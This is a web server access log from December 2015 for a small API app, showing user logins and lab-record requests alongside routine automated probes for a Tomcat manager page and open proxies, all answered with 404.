203.171.246.254 - - [24/Dec/2015:18:08:26 +0000] "POST /api/lab HTTP/1.1" 200 108 "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.254 - - [24/Dec/2015:18:08:30 +0000] "GET /api/lab HTTP/1.1" 200 1328 "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.254 - - [24/Dec/2015:18:30:49 +0000] "POST /api/user/login HTTP/1.1" 200 529 "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.254 - - [24/Dec/2015:18:36:06 +0000] "GET /api/lab HTTP/1.1" 304 - "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
184.95.52.218 - - [24/Dec/2015:18:50:55 +0000] "GET http://azenv.net/ HTTP/1.1" 404 92 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0"
91.236.75.4 - - [24/Dec/2015:20:26:39 +0000] "GET http://www.google.com/reader/about/ HTTP/1.1" 404 92 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
220.167.100.13 - - [24/Dec/2015:22:20:59 +0000] "GET /manager/html HTTP/1.1" 404 92 "-" "Mozilla/3.0 (compatible; Indy Library)"
202.109.143.18 - - [25/Dec/2015:01:01:31 +0000] "GET /manager/html HTTP/1.1" 404 92 "-" "Mozilla/3.0 (compatible; Indy Library)"
142.4.40.41 - - [25/Dec/2015:08:36:23 +0000] "GET /manager/html HTTP/1.1" 404 92 "-" "Mozilla/3.0 (compatible; Indy Library)"
89.248.167.162 - - [25/Dec/2015:10:35:21 +0000] "GET / HTTP/1.0" 404 92 "-" "-"
185.25.151.159 - - [25/Dec/2015:16:22:14 +0000] "GET http://testp3.pospr.waw.pl/testproxy.php HTTP/1.1" 404 92 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
74.101.233.155 - - [25/Dec/2015:19:44:11 +0000] "POST /api/user/login HTTP/1.1" 200 529 "http://52.77.210.85/precisedelivery/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"
74.101.233.155 - - [25/Dec/2015:19:44:29 +0000] "GET /api/lab HTTP/1.1" 200 1328 "http://52.77.210.85/precisedelivery/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"
74.101.233.155 - - [25/Dec/2015:19:46:05 +0000] "POST /api/lab HTTP/1.1" 200 194 "http://52.77.210.85/precisedelivery/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"
74.101.233.155 - - [25/Dec/2015:19:46:21 +0000] "GET /api/lab HTTP/1.1" 200 1328 "http://52.77.210.85/precisedelivery/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"
74.101.233.155 - - [25/Dec/2015:19:46:32 +0000] "GET /api/lab HTTP/1.1" 304 - "http://52.77.210.85/precisedelivery/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"
74.101.233.155 - - [25/Dec/2015:19:47:13 +0000] "POST /api/lab HTTP/1.1" 200 194 "http://52.77.210.85/precisedelivery/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"
74.101.233.155 - - [25/Dec/2015:19:47:21 +0000] "POST /api/lab HTTP/1.1" 200 194 "http://52.77.210.85/precisedelivery/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"
74.101.233.155 - - [25/Dec/2015:19:47:29 +0000] "POST /api/lab HTTP/1.1" 200 194 "http://52.77.210.85/precisedelivery/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"
74.101.233.155 - - [25/Dec/2015:19:47:35 +0000] "GET /api/lab HTTP/1.1" 200 1328 "http://52.77.210.85/precisedelivery/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"
202.109.143.18 - - [25/Dec/2015:23:22:36 +0000] "GET /manager/html HTTP/1.1" 404 92 "-" "Mozilla/3.0 (compatible; Indy Library)"
104.219.238.10 - - [26/Dec/2015:01:12:07 +0000] "GET / HTTP/1.0" 404 92 "-" "-"
203.171.246.125 - - [26/Dec/2015:05:44:21 +0000] "GET /api/lab HTTP/1.1" 200 105 "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:05:44:26 +0000] "POST /api/user/login HTTP/1.1" 200 529 "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:05:44:31 +0000] "GET /api/lab HTTP/1.1" 200 1328 "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:05:48:46 +0000] "GET /api/lab HTTP/1.1" 304 - "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:05:49:11 +0000] "GET /api/lab HTTP/1.1" 304 - "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:05:50:27 +0000] "GET /api/lab HTTP/1.1" 304 - "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:05:50:49 +0000] "GET /api/lab HTTP/1.1" 304 - "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:05:51:35 +0000] "GET /api/lab HTTP/1.1" 304 - "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:05:51:53 +0000] "GET /api/lab HTTP/1.1" 304 - "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:05:54:51 +0000] "GET /api/lab HTTP/1.1" 304 - "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:05:56:29 +0000] "GET /api/lab HTTP/1.1" 304 - "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:05:57:22 +0000] "GET /api/lab HTTP/1.1" 304 - "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:05:57:37 +0000] "DELETE /api/lab/undefined HTTP/1.1" 200 155 "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:05:57:38 +0000] "GET /api/lab HTTP/1.1" 304 - "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:05:58:46 +0000] "GET /api/lab HTTP/1.1" 304 - "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:05:59:07 +0000] "GET /api/lab HTTP/1.1" 304 - "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:05:59:47 +0000] "GET /api/lab HTTP/1.1" 304 - "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:05:59:51 +0000] "DELETE /api/lab/567adf5d09aba3e159e642d1 HTTP/1.1" 200 108 "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:05:59:51 +0000] "GET /api/lab HTTP/1.1" 200 1020 "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:06:00:08 +0000] "GET /api/lab HTTP/1.1" 304 - "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:06:00:13 +0000] "DELETE /api/lab/567c23903201aaeb616d361b HTTP/1.1" 200 108 "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:06:00:13 +0000] "GET /api/lab HTTP/1.1" 200 724 "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:06:03:17 +0000] "GET /api/lab HTTP/1.1" 304 - "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:06:03:21 +0000] "DELETE /api/lab/567c27803201aaeb616d361c HTTP/1.1" 200 108 "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:06:03:21 +0000] "GET /api/lab HTTP/1.1" 200 412 "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:06:03:33 +0000] "GET /api/lab HTTP/1.1" 304 - "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:06:04:27 +0000] "GET /api/lab HTTP/1.1" 304 - "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:06:36:32 +0000] "GET /api/lab HTTP/1.1" 304 - "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:06:36:41 +0000] "GET /api/lab HTTP/1.1" 304 - "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:06:37:21 +0000] "GET /api/lab HTTP/1.1" 304 - "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:06:42:00 +0000] "GET /api/lab HTTP/1.1" 304 - "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:06:57:57 +0000] "GET /api/lab HTTP/1.1" 304 - "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:06:58:19 +0000] "GET /api/lab HTTP/1.1" 304 - "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:07:06:18 +0000] "GET /api/lab HTTP/1.1" 304 - "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:07:18:19 +0000] "GET /api/lab HTTP/1.1" 304 - "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:07:19:14 +0000] "POST /api/user/login HTTP/1.1" 200 529 "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:07:19:19 +0000] "GET /api/lab HTTP/1.1" 200 412 "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:07:19:29 +0000] "GET /api/lab HTTP/1.1" 304 - "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:07:19:40 +0000] "GET /api/lab HTTP/1.1" 304 - "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:07:33:03 +0000] "POST /api/user/login HTTP/1.1" 200 529 "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:07:34:04 +0000] "POST /api/user/login HTTP/1.1" 200 529 "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:07:34:12 +0000] "GET /api/lab HTTP/1.1" 304 - "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:07:40:25 +0000] "GET /api/lab HTTP/1.1" 304 - "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:07:41:49 +0000] "POST /api/user/login HTTP/1.1" 200 529 "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:07:41:55 +0000] "GET /api/lab HTTP/1.1" 200 412 "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:07:43:53 +0000] "GET /api/lab HTTP/1.1" 304 - "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:07:46:47 +0000] "GET /api/lab HTTP/1.1" 304 - "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:07:48:25 +0000] "GET /api/lab HTTP/1.1" 304 - "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:07:54:17 +0000] "POST /api/user/login HTTP/1.1" 200 529 "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:07:54:26 +0000] "GET /api/lab HTTP/1.1" 200 412 "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:07:55:34 +0000] "POST /api/user/login HTTP/1.1" 200 529 "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:07:55:38 +0000] "GET /api/lab HTTP/1.1" 304 - "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:07:58:41 +0000] "POST /api/user/login HTTP/1.1" 200 529 "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"
203.171.246.125 - - [26/Dec/2015:07:59:01 +0000] "GET /api/lab HTTP/1.1" 200 412 "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"
203.171.246.125 - - [26/Dec/2015:08:00:23 +0000] "POST /api/user/login HTTP/1.1" 200 529 "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:08:00:27 +0000] "GET /api/lab HTTP/1.1" 304 - "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:08:01:12 +0000] "GET /api/lab HTTP/1.1" 304 - "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:08:07:07 +0000] "GET /api/lab HTTP/1.1" 304 - "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:08:09:00 +0000] "GET /api/lab HTTP/1.1" 304 - "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:08:11:26 +0000] "GET /api/lab HTTP/1.1" 200 116 "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"
203.171.246.125 - - [26/Dec/2015:08:11:50 +0000] "GET /api/lab HTTP/1.1" 304 - "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:08:19:07 +0000] "POST /api/lab/567c349a3201aaeb616d361d HTTP/1.1" 404 92 "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:08:19:47 +0000] "GET /api/lab/567c349a3201aaeb616d361d HTTP/1.1" 200 410 "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:08:19:50 +0000] "GET /api/lab HTTP/1.1" 304 - "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:08:24:25 +0000] "GET /api/lab HTTP/1.1" 304 - "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:08:24:37 +0000] "GET /api/lab/567c349a3201aaeb616d361d HTTP/1.1" 304 - "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:08:25:47 +0000] "GET /api/lab/567c349a3201aaeb616d361d HTTP/1.1" 304 - "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:08:25:58 +0000] "POST /api/lab HTTP/1.1" 200 122 "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:08:28:19 +0000] "GET /api/lab/567c349a3201aaeb616d361d HTTP/1.1" 304 - "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:08:28:24 +0000] "PUT /api/lab HTTP/1.1" 200 107 "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:08:28:27 +0000] "GET /api/lab HTTP/1.1" 200 412 "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:08:28:30 +0000] "GET /api/lab/567c349a3201aaeb616d361d HTTP/1.1" 200 410 "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:08:28:41 +0000] "GET /api/lab/567c349a3201aaeb616d361d HTTP/1.1" 304 - "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:08:28:46 +0000] "PUT /api/lab HTTP/1.1" 200 107 "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:08:28:49 +0000] "GET /api/lab HTTP/1.1" 200 412 "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:08:30:02 +0000] "GET /api/lab HTTP/1.1" 304 - "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:08:30:05 +0000] "GET /api/lab/567c349a3201aaeb616d361d HTTP/1.1" 304 - "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:08:30:14 +0000] "PUT /api/lab HTTP/1.1" 200 107 "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:08:30:17 +0000] "GET /api/lab HTTP/1.1" 200 412 "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.125 - - [26/Dec/2015:08:30:18 +0000] "GET /api/lab/567c349a3201aaeb616d361d HTTP/1.1" 200 410 "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
202.109.143.18 - - [26/Dec/2015:09:47:29 +0000] "GET /manager/html HTTP/1.1" 404 92 "-" "Mozilla/3.0 (compatible; Indy Library)"
202.109.143.18 - - [26/Dec/2015:11:15:10 +0000] "GET /manager/html HTTP/1.1" 404 92 "-" "Mozilla/3.0 (compatible; Indy Library)"
27.255.67.132 - - [26/Dec/2015:15:56:02 +0000] "GET /manager/html HTTP/1.1" 404 92 "-" "Mozilla/3.0 (compatible; Indy Library)"
202.109.143.18 - - [30/Dec/2015:02:17:22 +0000] "GET /manager/html HTTP/1.1" 404 92 "-" "Mozilla/3.0 (compatible; Indy Library)"
85.25.74.174 - - [30/Dec/2015:08:04:55 +0000] "GET / HTTP/1.1" 404 92 "-" "libwww-perl/6.15"
61.160.247.231 - - [30/Dec/2015:15:09:03 +0000] "GET /manager/html HTTP/1.1" 404 92 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)"
116.193.139.16 - - [30/Dec/2015:15:44:29 +0000] "GET / HTTP/1.1" 404 92 "-" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
